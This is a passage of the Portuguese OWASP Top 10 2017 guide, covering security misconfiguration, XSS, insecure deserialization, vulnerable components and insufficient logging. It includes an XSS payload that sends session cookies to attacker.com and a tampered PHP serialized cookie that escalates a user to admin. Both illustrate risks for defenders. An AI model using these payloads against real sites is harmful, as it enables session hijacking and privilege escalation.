<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 3</td>
<td>Prevalência 3 | Detectabilidade 3</td>
<td>Técnico 2 | Negócio</td>
</tr>
<tr class="even">
<td>Atacantes geralmente tentarão acessar contas padrão, páginas não utilizadas, falhas não corrigidas, arquivos e diretórios desprotegidos, etc., para obter acesso não autorizado ou conhecimento do sistema.</td>
<td>A configuração incorreta da segurança pode acontecer em qualquer nível das camadas da aplicação, incluindo serviços de rede, plataforma, servidor web, servidor de aplicativos, banco de dados, estruturas, código personalizado e máquinas virtuais, de contêineres ou de armazenamento pré-instaladas. Os scanners automatizados são úteis para detectar configurações erradas, uso de contas ou configurações padrão, serviços desnecessários, opções legadas etc.</td>
<td>Tais falhas freqüentemente dão aos atacantes acesso não autorizado a alguns dados ou funcionalidades do sistema. Ocasionalmente, tais falhas resultam em um comprometimento total do sistema. O impacto comercial depende das necessidades de proteção de sua aplicação e dados.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-5">A Aplicação Está Vulnerável?</h2>
<p>A aplicação pode ser vulnerável se:</p>
<ul>
<li>Falta endurecimento de segurança adequado em qualquer parte das camadas da aplicação.</li>
<li>Recursos desnecessários são habilitados ou instalados (por exemplo, portas, serviços, páginas, contas ou privilégios desnecessários).</li>
<li>As contas padrão e suas senhas ainda são ativadas e inalteradas.</li>
<li>O tratamento de erros revela vestígios de <em>stacktraces</em> ou outras mensagens de erro excessivamente informativas aos usuários.</li>
<li>Para sistemas atualizados, os recursos de segurança mais recentes estão desativados ou não estão configurados de forma segura.</li>
<li>As configurações de segurança nos servidores de aplicação, frameworks de aplicação (por exemplo, Struts, Spring, ASP.NET), bibliotecas, bancos de dados, etc., não configurados para valores seguros.</li>
<li>O servidor não envia cabeçalhos ou diretivas de segurança ou não está configurado para valores seguros.</li>
<li>O software está desatualizado ou vulnerável (consulte <strong>A9:2017-Utilização de Componentes com Vulnerabilidades Conhecidas</strong>). Sem um processo planejado e repetido de configuração de segurança de aplicações, os sistemas estão em maior risco.</li>
</ul>
<h2 id="como-prevenir-5">Como Prevenir</h2>
<p>Processos de instalação segura devem ser implementados, incluindo:</p>
<ul>
<li>Um processo de endurecimento replicável que torne rápido e fácil implantar outro ambiente que esteja devidamente bloqueado. Desenvolvimento, QA e ambientes de produção devem ser configurados de forma idêntica, com diferentes credenciais usadas em cada ambiente. Este processo deve ser automatizado para minimizar o esforço necessário para configurar um novo ambiente seguro.</li>
<li>Uma plataforma mínima sem recursos, componentes, documentação e amostras desnecessários. Remova ou não instale recursos e frameworks não utilizados.</li>
<li>Uma tarefa para revisar e atualizar as configurações apropriadas para todas as notas de segurança, atualizações e patches como parte do processo de gerenciamento de patches (veja <strong>A9:2017-Utilização de Componentes com Vulnerabilidades Conhecidas</strong>).</li>
<li>Uma arquitetura de aplicações segmentados que forneça separação efetiva e segura entre componentes ou inquilinos, com segmentação, conteinerização ou grupos de segurança de nuvem (ACLs).</li>
<li>Enviar diretivas de segurança para agentes clientes, por exemplo <a href="https://owasp.org/www-project-secure-headers/">Cabeçalhos de segurança</a>.</li>
<li>Um processo automatizado para verificar a eficácia das configurações e configurações em todos os ambientes</li>
</ul>
<h2 id="exemplo-de-cenários-de-ataque-1">Exemplo de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: O servidor de aplicação vem com aplicativos de exemplo que não são removidos do seu servidor de produção. Esses aplicativos de exemplo possuem falhas conhecidas de segurança que atacantes usam para comprometer seu servidor. Se um desses aplicativos for o console de administração, e as contas padrão não foram alteradas, o atacante faz logon com senhas padrão e assume o controle.</p>
<p><strong>Cenário #2</strong>: A listagem de diretórios não está desativada em seu servidor. Um atacante descobre que ele pode simplesmente listar diretórios. O atacante localiza e baixa suas classes Java compiladas, que são então descompiladas e sofrem engenharia reversa para visualizar seu código. O atacante então encontra uma falha séria de controle de acesso em sua aplicação.</p>
<p><strong>Cenário #3</strong>: A configuração do servidor de aplicação permite mensagens de erro detalhadas, por exemplo, stacktraces que retornam para os usuários. Isso potencialmente expõe informações sensíveis ou falhas subjacentes, como versões de componentes que são conhecidas como vulneráveis.</p>
<p><strong>Cenário #4</strong>: A configuração padrão ou uma antiga copiada ativa as versões antigas ou opções de protocolo vulneráveis que podem ser mal utilizadas por um atacante ou malware.</p>
<h2 id="referências-6">Referências</h2>
<h3 id="owasp-5">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README">OWASP Testing Guide: Configuration Management</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README">OWASP Testing Guide: Testing for Error Codes</a></li>
<li><a href="https://owasp.org/www-project-secure-headers/">OWASP Security Headers Project</a></li>
</ul>
<p>For additional requirements in this area, see the <a href="https://owasp.org/www-project-application-security-verification-standard/">ASVS requirements areas for Security Configuration (V11 and V19)</a>.</p>
<h3 id="externas-5">Externas</h3>
<ul>
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-123/final">NIST Guide to General Server Hardening</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/2.html">CWE-2: Environmental Security Flaws</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/388.html">CWE-388: Error Handling</a></li>
<li><a href="https://www.cisecurity.org/cis-benchmarks/">CIS Security Configuration Guides/Benchmarks</a></li>
</ul>
<h1 id="a72017-cross-site-scripting-xss">A7:2017 Cross-Site Scripting (XSS)</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 3</td>
<td>Prevalência 3 | Detectabilidade 3</td>
<td>Técnico 2 | Negócio</td>
</tr>
<tr class="even">
<td>Ferramentas automatizadas podem detectar e explorar as três formas de XSS, e existem frameworks de exploits disponíveis gratuitamente.</td>
<td>XSS é o segundo problema mais prevalente no OWASP Top 10, e é encontrado em cerca de dois terços de todas as aplicações. As ferramentas automatizadas podem encontrar alguns problemas XSS automaticamente, particularmente em tecnologias maduras, como PHP, J2EE / JSP e ASP.NET.</td>
<td>O impacto do XSS é moderado para refletido e DOM XSS, e grave para XSS armazenado, com execução remota de código no navegador da vítima, como roubar credenciais, sessões ou entregar malwares à vítima.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-6">A Aplicação está Vulnerável?</h2>
<p>Existem três formas de XSS, geralmente visando os navegadores dos usuários:</p>
<ul>
<li><strong>XSS Refletido</strong>: Sua aplicação ou API inclui entradas de usuário não validadas e não modificadas como parte da saída HTML. Um ataque bem sucedido pode permitir que o atacante execute HTML e JavaScript arbitrários no navegador da vítima. Normalmente, o usuário precisará interagir com algum link malicioso que aponte para uma página controlada pelo atacante, como sites maliciosos de <em>watering hole</em>, propagandas ou similares.</li>
<li><strong>XSS Armazenado</strong>: Sua aplicação ou API armazena entradas de usuário não sanitizadas que é vista mais tarde por outro usuário ou administrador. O XSS armazenado é frequentemente considerado de risco alto ou crítico.</li>
<li><strong>DOM XSS</strong>: Frameworks de JavaScript, aplicativos de uma única página (SPAs) e APIs que incluem dinamicamente dados controláveis pelo atacante para uma página são vulneráveis ao DOM XSS. Idealmente, sua aplicação não enviaria dados controláveis pelo atacante para APIs de JavaScript inseguras.</li>
</ul>
<p>Ataques XSS típicos incluem o roubo de sessão, a aquisição de contas, <em>bypass</em> de MFA (MultiFactor Authentication), a substituição de nós DOM ou o desfiguramento (como os painéis de login de trojan), ataques contra o navegador do usuário, como downloads de software mal-intencionado, <em>key logging</em> e outros ataques do lado do cliente.</p>
<h2 id="como-prevenir-6">Como Prevenir</h2>
<p>Prevenir XSS requer a separação de dados não confiáveis do conteúdo ativo do navegador. Isso pode ser alcançado por:</p>
<ul>
<li>Use frameworks que automaticamente escapam o XSS por design, como os mais recentes Ruby on Rails, React JS. Aprenda as limitações de proteção XSS de cada framework e cuide adequadamente os casos de uso que não são cobertos.</li>
<li>Usar frameworks que automaticamente sanitizam o XSS por design, como Ruby on Rails e React JS mais recentes. Aprenda as limitações de proteção XSS de cada framework e cuide adequadamente os casos de uso que não são cobertos.</li>
<li>Sanitizar por <em>escape</em> dados de solicitação HTTP não confiáveis com base no contexto na saída HTML (corpo, atributo, JavaScript, CSS ou URL) irá resolver vulnerabilidades XSS refletidas e armazenadas. A <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Folha de Dicas OWASP 'XSS Prevention'</a> contém detalhes sobre técnicas de <em>escape</em> de dados necessárias.</li>
<li>Aplicar <em>encoding</em> sensível ao contexto ao modificar o documento do navegador no lado do cliente atua contra DOM XSS. Quando isso não puder ser evitado, técnicas de <em>escaping</em> sensíveis ao contexto semelhantes podem ser aplicadas às APIs do navegador, conforme descrito na Folha de Dicas OWASP 'DOM Based XSS Prevention'.</li>
<li>Habilitar um <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a> é um controle de mitigação de defesa profunda contra o XSS. É eficaz se não existem outras vulnerabilidades que permitiriam colocar códigos maliciosos através de arquivos locais (por exemplo, sobrescritas de <em>path traversal</em> ou bibliotecas vulneráveis em fontes permitidas).</li>
</ul>
<h2 id="exemplo-de-cenários-de-ataque-2">Exemplo de Cenários de Ataque</h2>
<p><strong>Cenário 1</strong>: A aplicação usa dados não confiáveis na construção do seguinte fragmento HTML sem validação ou <em>escaping</em>:</p>
<p><code>(String) page += "&lt;input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'&gt;";</code></p>
<p>O atacante modifica o parâmetro 'CC' no navegador para:</p>
<p><code>'&gt;&lt;script&gt;document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie&lt;/script&gt;'</code></p>
<p>Este ataque faz com que a ID da sessão da vítima seja enviada para o site do invasor, permitindo que o invasor seqüestra a sessão atual do usuário.</p>
<p><strong>Nota</strong>: Atacantes podem usar XSS para derrubar qualquer defesa CSRF automatizada que a aplicação possa empregar.</p>
<h2 id="referências-7">Referências</h2>
<h3 id="owasp-6">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proactive Controls: Encode Data</a></li>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data">OWASP Proactive Controls: Validate Data</a></li>
<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard: V5</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">OWASP Testing Guide: Testing for Reflected XSS</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">OWASP Testing Guide: Testing for Stored XSS</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting">OWASP Testing Guide: Testing for DOM XSS</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: XSS Prevention</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet: DOM based XSS Prevention</a></li>
<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">OWASP Cheat Sheet: XSS Filter Evasion</a></li>
<li><a href="https://owasp.org/www-project-java-encoder/">OWASP Java Encoder Project</a></li>
</ul>
<h3 id="externas-6">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper neutralization of user supplied input</a></li>
<li><a href="https://portswigger.net/kb/issues/00200308_client-side-template-injection">PortSwigger: Client-side template injection</a></li>
</ul>
<h1 id="a82017-desserialização-insegura">A8:2017 Desserialização insegura</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 1</td>
<td>Prevalência 2 | Detectabilidade 2</td>
<td>Técnico 3 | Negócio</td>
</tr>
<tr class="even">
<td>A exploração da desserialização é um tanto difícil, pois as explorações prontas <em>off the shelf</em> raramente funcionam sem mudanças ou ajustes no código interno de exploração.</td>
<td>Este problema está incluído no Top 10 com base em uma <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">pesquisa da indústria</a> e não em dados quantificáveis. Algumas ferramentas podem descobrir falhas de desserialização, mas a assistência humana é freqüentemente necessária para validar o problema. Espera-se que os dados de prevalência para falhas de desserialização aumentem à medida que as ferramentas são desenvolvidas para ajudar a identificá-los e resolvê-los.</td>
<td>O impacto das falhas de desserialização não pode ser subestimado. Essas falhas podem levar a ataques execução remota de código, sendo um dos ataques mais sérios possível. O impacto comercial depende das necessidades de proteção de sua aplicação e dados.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-7">A aplicação está vulnerável?</h2>
<p>Aplicações e APIs estarão vulneráveis se desserializarem objetos hostis ou adulterados fornecidos por um atacante.</p>
<p>Isso pode resultar em dois principais tipos de ataques:</p>
<ul>
<li>Ataques relacionados com a estrutura de objetos e dados onde o atacante modifica a lógica do aplicativo ou consegue a execução de código remoto arbitrário se houver classes disponíveis para a aplicação que possam alterar o comportamento durante ou após a desserialização.</li>
<li>Ataques típicos de manipulação de dados, como ataques de controle de acesso, onde as estruturas de dados existentes são usadas, mas o conteúdo é alterado.</li>
</ul>
<p>Serialização pode ser usada em aplicações para:</p>
<ul>
<li>Comunicação remota / interprocesso (RPC / IPC)</li>
<li>Protocolos com fio, serviços web, <em>message brokers</em></li>
<li>Caching/Persistência</li>
<li>Bancos de dados, servidores de cache, sistemas de arquivos</li>
<li>Cookies HTTP, parâmetros de formulário HTML, tokens de autenticação de API</li>
</ul>
<h2 id="como-prevenir-7">Como Prevenir</h2>
<p>O único padrão de arquitetura seguro é não aceitar objetos serializados de fontes não confiáveis ou usar mídias de serialização que só permitem tipos de dados primitivos.</p>
<p>Se isso não for possível:</p>
<ul>
<li>Implementar verificações de integridade, tais como assinaturas digitais em qualquer objeto serializado para evitar a criação de objetos hostis ou a manipulação de dados.</li>
<li>Aplicar restrições de tipos estritos durante a desserialização antes da criação do objeto, pois seu código geralmente espera um conjunto definível de classes. Foram demonstrados casos onde esta restrição foi superada, portanto a dependência exclusiva nela não é aconselhável.</li>
<li>Isolar e executar o código que desserializa em ambientes de baixos privilégios quando possível.</li>
<li>Registrar as exceções e falhas de desserialização como, por exemplo, onde o tipo de entrada não é o tipo esperado, ou a desserialização lança exceções.</li>
<li>Restringir ou monitorar a conectividade de rede de entrada e de saída de contêineres ou servidores que desserializem.</li>
<li>Monitorizar a desserialização, alertando se um usuário desserializar constantemente.</li>
</ul>
<h2 id="exemplos-de-cenários-de-ataque-2">Exemplos de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: Uma aplicação React chama um conjunto de microsserviços Spring Boot. Sendo programadores funcionais, eles tentaram garantir que seu código seja imutável. A solução que eles inventaram é serializar o estado do usuário e passá-lo para frente e para trás em cada request. Um atacante percebe a assinatura "R00" do objeto Java e usa a ferramenta Java Serial Killer para obter uma execução de código remoto no servidor da aplicação.</p>
<p><strong>Cenário #2</strong>: Um fórum em PHP usa a serialização de objeto PHP para salvar um "super" cookie, contendo o ID do usuário, o perfil, o hash da senha e outros estados do usuário:</p>
<p><code>a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></p>
<p>Um atacante altera o objeto serializado para se dar privilégios de administrador:</p>
<p><code>a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></p>
<h2 id="referências-8">Referências</h2>
<h3 id="owasp-7">OWASP</h3>
<ul>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">OWASP Cheat Sheet: Deserialization</a></li>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs">OWASP Proactive Controls: Validate All Inputs</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard: TBA</a></li>
<li><a href="https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse">OWASP AppSecEU 2016: Surviving the Java Deserialization Apocalypse</a></li>
<li><a href="https://speakerdeck.com/pwntester/friday-the-13th-json-attacks">OWASP AppSecUSA 2017: Friday the 13th JSON Attacks</a></li>
</ul>
<h3 id="externas-7">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
<li><a href="https://github.com/mbechler/marshalsec">Java Unmarshaller Security</a></li>
<li><a href="https://frohoff.github.io/appseccali-marshalling-pickles/">OWASP AppSec Cali 2015: Marshalling Pickles</a></li>
</ul>
<h1 id="a92017-utilização-de-componentes-com-vulnerabilidades-conhecidas">A9:2017 Utilização de Componentes com Vulnerabilidades Conhecidas</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 2</td>
<td>Prevalência 3 | Detectabilidade 2</td>
<td>Técnico 2 | Negócio</td>
</tr>
<tr class="even">
<td>Embora seja fácil encontrar explorações já escritas para muitas vulnerabilidades conhecidas, outras vulnerabilidades requerem esforço concentrado para desenvolver uma exploração personalizada. </td>
<td>A prevalência desta questão é muito difundida. Padrões de desenvolvimento de fortemente orientados a componentes podem levar as equipes de desenvolvimento a não entender quais componentes elas usam em sua aplicação ou API, quanto menos mantê-los atualizados. Alguns scanners, como retire.js ajudam na detecção, mas a determinação da vulnerabilidade requer esforço adicional.</td>
<td>Enquanto algumas vulnerabilidades conhecidas levam a apenas impactos menores, algumas das maiores brechas até agora se basearam em explorar vulnerabilidades conhecidas nos componentes. Dependendo dos ativos que você está protegendo, talvez esse risco esteja no topo da sua lista.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-8">A Aplicação Está Vulnerável?</h2>
<p>Você provavelmente está vulnerável:</p>
<ul>
<li>Se você não conhece as versões de todos os componentes que você usa (tanto do lado do cliente quanto do lado do servidor). Isso inclui componentes que você usa diretamente, bem como dependências aninhadas.</li>
<li>Se algum dos seus softwares está desatualizado. Isso inclui o SO, Servidor Web/App, DBMS, aplicações, APIs e todos os componentes, ambientes de execução e bibliotecas.</li>
<li>Se você não procura vulnerabilidades regularmente e se inscreve em boletins de segurança relacionados aos componentes que você usa.</li>
<li>Se você não arruma ou atualiza a plataforma que utiliza, frameworks e dependências em tempo hábil. Isso geralmente acontece em ambientes onde atualização de patches é uma tarefa mensal ou trimestral sob controle de mudanças, o que deixa as organizações abertas para muitos dias ou meses de exposição desnecessária a vulnerabilidades já consertadas.</li>
<li>Se você não mantém seguras as configurações dos componentes (veja <strong>A6:2017-Configuração Incorreta de Segurança</strong>).</li>
</ul>
<h2 id="como-prevenir-8">Como Prevenir</h2>
<p>Projetos de software devem ter um processo para:</p>
<ul>
<li>Remover dependências não utilizadas, recursos desnecessários, componentes, arquivos e documentação.</li>
<li>Manter continuamente um inventário das versões dos componentes do lado do cliente e do lado do servidor (por exemplo, frameworks, bibliotecas) e suas dependências usando ferramentas como <em>versions, DependencyCheck, retire.js</em>, etc.</li>
<li>Monitorar continuamente fontes como CVE e NVD para vulnerabilidades em seus componentes. Use ferramentas de análise de composição de software para automatizar o processo. Assine os alertas de e-mails para vulnerabilidades de segurança relacionadas aos componentes que você usa.</li>
<li>Obtenha seus componentes apenas de fontes oficiais e, quando possível, prefira pacotes assinados para reduzir a chance de obter um componente malicioso modificado.</li>
<li>Monitore bibliotecas e componentes que não são mantidos ou não tem mais patches de segurança para versões mais antigas. Se o patch não for possível, considere implantar um patch virtual para monitorar, detectar ou proteger contra o problema descoberto.</li>
</ul>
<p>Toda organização deve garantir que haja um plano contínuo de monitoramento, triagem e aplicação de atualizações ou mudanças de configuração para toda a vida da aplicação ou portfólio.</p>
<h2 id="exemplos-de-cenários-de-ataque-3">Exemplos de Cenários de Ataque</h2>
<p><strong>Cenário #1</strong>: Componentes tipicamente são executados com os mesmos privilégios da própria aplicação, portanto, falhas em qualquer componente podem resultar em impacto sério. Tais falhas podem ser acidentais (por exemplo, erro de codificação) ou intencional (por exemplo, <em>backdoor</em> no componente). Alguns exemplos de vulnerabilidades de componentes exploráveis descobertos são:</p>
<ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638">CVE-2017-5638</a>, uma vulnerabilidade de execução remota de código no Struts 2 que permite a execução de código arbitrário em o servidor, foi culpado por brechas significativas.</li>
<li>Enquanto <a href="https://en.wikipedia.org/wiki/Internet_of_things">a internet das coisas (IoT)</a> são freqüentemente difíceis ou impossíveis de corrigir, a importância de corrigi-los pode ser grande (por exemplo: <a href="https://arstechnica.com/information-technology/2017/08/465k-patients-need-a-firmware-update-to-prevent-serious-pacemaker-hacks/">marca-passos de St. Jude</a>).</li>
</ul>
<p>Existem ferramentas automatizadas para ajudar os invasores a encontrar sistemas não corrigidos ou mal configurados. Por exemplo, o <a href="https://www.shodan.io/">mecanismo de busca de IoT Shodan</a> pode ajudá-lo a encontrar dispositivos que ainda sofrem com a vulnerabilidade <a href="https://en.wikipedia.org/wiki/Heartbleed">Heartbleed</a> que foi corrigida em abril de 2014.</p>
<h2 id="referências-9">Referências</h2>
<h3 id="owasp-8">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-application-security-verification-standard/">OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling</a></li>
<li><a href="https://owasp.org/www-project-dependency-check/">OWASP Dependency Check (for Java and .NET libraries)</a></li>
<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture">OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)</a></li>
<li><a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">OWASP Virtual Patching Best Practices</a></li>
</ul>
<h3 id="externas-8">Externas</h3>
<ul>
<li><p><a href="https://cdn2.hubspot.net/hub/203759/file-1100864196-pdf/docs/Contrast_-_Insecure_Libraries_2014.pdf">The Unfortunate Reality of Insecure Libraries</a></p></li>
<li><p><a href="https://www.cvedetails.com/version-search.php">MITRE Common Vulnerabilities and Exposures (CVE) search</a></p></li>
<li><p><a href="https://nvd.nist.gov/">National Vulnerability Database (NVD)</a></p></li>
<li><p><a href="https://github.com/retirejs/retire.js/">Retire.js for detecting known vulnerable JavaScript libraries</a></p></li>
<li><p><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></p></li>
</ul>
<h1 id="a102017-logs-e-monitoração-insuficientes">A10:2017 Logs e Monitoração Insuficientes</h1>
<table>
<thead>
<tr class="header">
<th>Agentes de Ameaça/Vetores de Ataque</th>
<th>Vulnerabilidades de Segurança</th>
<th>Impactos</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Nível de Acesso | Explorabilidade 2</td>
<td>Prevalência 3 | Detectabilidade 1</td>
<td>Técnico 2 | Negócio</td>
</tr>
<tr class="even">
<td>A exploração de logs e monitoração insuficientes é o alicerce de quase todos os incidentes importantes. Os atacantes contam com a falta de monitoração e respostas feitas a tempo para alcançar seus objetivos sem serem detectados.</td>
<td>Este problema está incluído no Top 10 com base em uma <a href="https://owasp.blogspot.com/2017/08/owasp-top-10-2017-project-update.html">pesquisa da indústria</a>. Uma estratégia para determinar se você tem monitoração suficiente é examinar seus registros após um teste de penetração. As ações dos testadores devem ser registradas o suficiente para entender quais os danos que podem ter feitos.</td>
<td>A maioria dos ataques bem sucedidos começa com sondagem de vulnerabilidade. Permitir que tais sondas continuem pode aumentar a probabilidade de exploração bem sucedida para quase 100%. Em 2016, a identificação de uma violação levou uma - tempo suficiente para que estragos fossem feitos.</td>
</tr>
</tbody>
</table>
<h2 id="a-aplicação-está-vulnerável-9">A Aplicação Está Vulnerável?</h2>
<p>Insuficiência de logs, de detecção, de monitoração e de resposta ativa ocorrem a qualquer momento:</p>
<ul>
<li>Eventos auditáveis, como logins, logins com falha e transações de alto valor não são registrados.</li>
<li>Os logs de aplicações e APIs não são monitorados para atividades suspeitas.</li>
<li>Os limiares de alerta e a escalação da resposta, conforme o risco dos dados detidos pela aplicação, não estão em vigor nem são efetivos.</li>
<li>Testes de penetração e varredura pelas ferramentas <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools">DAST</a> (como <a href="https://owasp.org/www-project-zap/">OWASP ZAP</a>) não desencadeiam alertas.</li>
</ul>
<p>Para as organizações maiores e de alto desempenho, a falta de respostas ativas, como atividades de alerta e resposta em tempo real como o bloqueio de ataques automatizados em aplicações Web e particularmente APIs, colocaria a organização em risco de um comprometimento estendido. A resposta não precisa necessariamente ser visível para o invasor, apenas que a aplicação e infra-estrutura associada, frameworks, camadas de serviço, etc. podem detectar e alertar humanos ou ferramentas para responder em tempo quase real.</p>
<h2 id="como-prevenir-9">Como Prevenir</h2>
<p>De acordo com o risco dos dados armazenados ou processados pela aplicação:</p>
<ul>
<li>Certifique-se de todos os logins, falhas de controle de acesso, as falhas de validação de entrada do lado do servidor possam ser registradas com um contexto de usuário suficiente para identificar contas suspeitas ou mal-intencionadas e mantidas por tempo suficiente para permitir análises forenses demoradas.</li>
<li>Certifique-se de que os logs são gerados em um formato que pode ser facilmente consumido por uma solução centralizada de gerenciamento de logs.</li>
<li>Certifique-se de que as transações de alto valor tenham uma trilha de auditoria com controles de integridade para evitar adulterações ou exclusões, como anexar apenas tabelas de banco de dados ou similares.</li>
<li>Estabeleça monitorações e alertas eficazes, de modo que as atividades suspeitas sejam detectadas e respondidas em tempo hábil.</li>
<li>Estabeleça ou adote um plano de respostas e recuperação a incidentes, como <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a> ou posterior.</li>
</ul>
<p>Existem frameworks de proteção de aplicações comerciais e de código aberto, como <a href="https://owasp.org/www-project-appsensor/">OWASP AppSensor</a>, firewalls de aplicações Web, como <a href="https://owasp.org/www-project-modsecurity-core-rule-set/">mod_security com o OWASP Core Rule Set</a> e software de correlação de logs com painéis personalizados e alertas.</p>
<h2 id="exemplos-de-cenários-de-ataque-4">Exemplos de Cenários de Ataque</h2>
<p><strong>Cenário 1</strong>: Um software de fórum de código aberto executado por uma pequena equipe foi pirateado usando uma falha em seu software. Os atacantes conseguiram eliminar o repositório de código fonte interno que contém a próxima versão e todos os conteúdos do fórum. Embora o código fonte possa ser recuperado, a falta de monitoração, logs ou alertas levou a uma violação muito pior. O projeto de software de fórum não está mais ativo como resultado dessa questão.</p>
<p><strong>Cenário 2</strong>: Um atacante usa varreduras para encontrar usuários que usam uma senha comum. Eles podem assumir todas as contas usando esta senha. Para todos os outros usuários, esta varredura deixa apenas 1 login falso para trás. Após alguns dias, isso pode ser repetido com uma senha diferente.</p>
<p><strong>Cenário 3</strong>: Um grande varejista dos EUA teria um sandbox interno de análise de malware analisando anexos. O sandbox detectou softwares potencialmente indesejados, mas ninguém respondeu a essa detecção. O sandbox tinha produzido avisos por algum tempo antes da violação ser detectada devido a transações fraudulentas de cartão por um banco externo.</p>
<h2 id="referências-10">Referências</h2>
<h3 id="owasp-9">OWASP</h3>
<ul>
<li><a href="https://owasp.org/www-project-proactive-controls/v3/en/c9-security-logging">OWASP Proactive Controls: Implement Logging and Intrusion Detection</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Application Security Verification Standard: V8 Logging and Monitoring</a></li>
<li><a href="https://github.com/OWASP/ASVS/blob/v4.0.2/4.0/en/0x11-V2-Authentication.md">OWASP Testing Guide: Testing for Detailed Error Code</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">OWASP Cheat Sheet: Logging</a></li>
</ul>
<h3 id="externas-9">Externas</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/778.html">CWE-778: Insufficient Logging</a></li>
</ul>
<h1 id="d-próximos-passos-para-desenvolvedores">+D Próximos Passos Para Desenvolvedores</h1>
<h2 id="estabeleça-e-use-processos-de-segurança-repetitivos-e-padrões-de-controles-de-segurança">Estabeleça e Use Processos de Segurança Repetitivos e Padrões de Controles de Segurança</h2>
<p>Quer você seja novo em segurança de aplicações Web ou já é familiarizado com estes riscos, a tarefa de produzir uma aplicação web segura ou corrigir uma existente pode ser difícil. Se tiver que gerir um grande portfolio de aplicações pode ser um pesadelo.</p>
